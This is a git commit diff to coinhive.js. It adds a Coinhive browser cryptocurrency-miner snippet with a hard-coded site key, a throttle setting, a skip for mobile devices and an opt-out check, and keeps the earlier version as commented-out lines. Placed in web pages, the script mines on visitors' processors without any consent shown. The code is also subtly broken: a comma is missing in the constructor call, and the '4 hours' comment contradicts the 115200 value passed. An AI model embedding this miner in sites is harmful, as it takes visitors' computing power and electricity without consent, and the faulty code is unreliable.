f68a5f76d75eb8f1cde758989d02665798f674cf
Janddda <janddda@yahoo.com>
2017-12-20 19:39:12 +0100

    Update coinhive.js

--- coinhive.js
+++ coinhive.js
@@ -1,4 +1,15 @@
+#<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+#<script>
+#var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' { throttle: 0.8 }); miner.start();
+#</script>
+
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' { throttle: 0.8 }); miner.start();
+<script> 
+  var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' {throttle: 0.3}); 
+  // Only start on non-mobile devices and if not opted-out 
+  // in the last 14400 seconds (4 hours): 
+  if (!miner.isMobile() && !miner.didOptOut(115200)) { 
+  miner.start(); 
+  } 
 </script>
+
